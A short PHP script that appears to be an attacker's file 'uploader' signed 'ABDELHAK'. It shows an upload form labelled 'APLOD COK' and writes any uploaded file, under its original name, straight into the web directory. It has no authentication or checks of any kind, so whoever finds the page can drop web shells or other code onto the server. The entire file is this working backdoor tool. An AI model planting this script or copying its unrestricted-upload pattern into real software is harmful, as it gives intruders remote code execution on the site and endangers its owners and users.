ABDELHAK
<?php 
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
 
echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file'name='file' />
        <input type='submit' value='APLOD COK' />
 
</form>";
 
if(move_uploaded_file($filetmp,$filename)=='1'){
echo '<b>'.$filename;
}
?>
